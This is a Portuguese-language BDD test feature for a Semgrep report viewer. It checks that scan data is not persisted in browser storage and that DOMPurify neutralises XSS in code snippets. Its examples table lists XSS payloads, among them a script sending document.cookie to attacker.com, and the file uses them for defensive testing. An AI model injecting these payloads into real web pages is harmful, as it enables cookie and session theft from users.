# language: pt
@privacy @xss @zero_persistence
Funcionalidade: Privacidade Client-Side & Defesa contra Cross-Site Scripting (XSS)
  Como usuário de segurança que analisa relatórios confidenciais de SAST
  Eu quero que o processamento do código ocorra 100% no navegador sem envio à nuvem
  E que todo conteúdo visualizado seja imune a ataques de injeção de script

  Contexto:
    Dado que a aplicação Semgrep CLI Visualizer está carregada no navegador

  @privacy @zero_persistence
  Cenário: Garantia de não persistência de dados de scan no localStorage
    Dado que o usuário carregou um relatório de scan contendo 50 vulnerabilidades e trechos de código
    Quando o usuário navega pelo dashboard e visualiza as métricas
    Então o "localStorage" deve conter exclusivamente a chave de idioma "semgrep_app_lang"
    E nenhuma vulnerabilidade ou trecho de código deve existir no "localStorage" ou "sessionStorage"

  @privacy @ram_reset
  Cenário: Limpeza imediata da memória RAM ao acionar Novo Scan
    Dado que um relatório de scan está carregado e visível no dashboard
    Quando o usuário clica no botão "Novo Scan" ou no logo para voltar ao início
    Então o estado da store Zustand deve ser redefinido para "report: null"
    E a memória da aplicação deve retornar ao estado inicial de apresentação

  @xss @dompurify
  Esquema do Cenário: Sanitização rigorosa de payloads maliciosos em snippets de código
    Dado que um arquivo de relatório Semgrep contém uma mensagem com payload XSS "<xss_payload>"
    Quando o analisador "defectdojo.adapter" processa o relatório
    E o usuário abre o modal "CodeViewerModal" para visualizar a vulnerabilidade
    Então o DOMPurify deve neutralizar a injeção removendo tags não permitidas
    E nenhum script JavaScript deve ser executado no contexto da página

    Exemplos:
      | xss_payload                                                        |
      | <script>document.location='http://attacker.com/?c='+document.cookie</script> |
      | <svg onload=alert(1)>                                              |
      | <iframe src="javascript:alert(1)">                                 |
      | <a href="javascript:alert(1)">Clique aqui</a>                      |
